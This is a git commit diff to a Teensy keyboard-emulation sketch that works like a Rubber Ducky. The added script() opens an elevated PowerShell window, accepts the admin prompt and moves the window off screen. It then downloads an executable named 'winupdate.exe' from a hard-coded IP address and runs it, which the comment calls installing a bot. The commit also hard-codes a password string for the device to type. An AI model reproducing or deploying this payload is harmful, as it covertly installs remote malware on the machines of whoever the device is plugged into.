541163c306a760f3b114ab8a87390e252dffc8b9
Leo Smith <k0oo@icloud.com>
2016-12-04 00:15:49 +0100

    🐤

--- tennsyduck/main.ino
+++ tennsyduck/main.ino
@@ -6,8 +6,29 @@
  * It has a builtin password typer. Executes Basic rubber-ducky
  * scripts.
  */
+ 
+//My keyboard lib
+#define DELAY delay(800)
+void resetKey()
+{
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+void pressModifier(long mod)
+{
+  Keyboard.set_modifier(mod);
+  Keyboard.send_now();
+}
+void pressKey(long key)
+{
+  Keyboard.set_key1(key);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
 
-#define PASSWD "HelloWorld"
+#define PASSWD "52!@6!86247205102bb82f@94!0rez"
 
 const int ledPin = 13;
 const int noExecPin = 23;
@@ -42,6 +63,7 @@ void setup() {
   } else {
     script();
   }
+  resetKey();
 }
 
 void loop() {
@@ -70,18 +92,20 @@ void ledBlinker(int inc)
 {
   for(int i = 0; i < inc; i++){
     digitalWrite(ledPin, (i % 2)? LOW: HIGH);
+    delay(70);
   }
 }
 
 void enterPass()
 {
   Keyboard.print(PASSWD);
-  delay(500);
+  ledBlinker(8);
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   delay(300);
   Keyboard.set_key1(0);
   Keyboard.send_now();
+  
 }
 
 // Rubber ducky 
@@ -89,8 +113,44 @@ void enterPass()
 //  install p4p1 bot
 void script()
 {
-
-  
+  pressModifier(MODIFIERKEY_GUI);
+  pressKey(KEY_D);
+  resetKey();
+  DELAY;
+  pressModifier(MODIFIERKEY_GUI);
+  resetKey();
+  DELAY;
+  Keyboard.print("powershell");
+  DELAY;
+  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
+  Keyboard.send_now();
+  pressKey(KEY_ENTER);
+  resetKey();
+  delay(1500);
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.send_now();
+  pressKey(KEY_O);
+  resetKey();
+  DELAY;
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.send_now();
+  pressKey(KEY_SPACE);
+  resetKey();
+  for(int i = 0; i < 100; i++){
+    pressKey( KEY_DOWN_ARROW );
+  }
+  DELAY;
+  pressKey(KEY_ENTER);
+  DELAY;
+  Keyboard.print("$client = new-object System.Net.WebClient");
+  pressKey(KEY_ENTER);
+  DELAY;
+  Keyboard.print("$client.DownloadFile(\"http://86.247.205.102/winupdate.exe\",\"winupdate.exe\")");
+  pressKey(KEY_ENTER);
+  delay(2000);
+  Keyboard.print(".\\winupdate.exe");
+  DELAY;
+  pressKey(KEY_ENTER);
 }
 
 //Second script: 
@@ -99,4 +159,3 @@ void sscript()
 {
 
 }
-
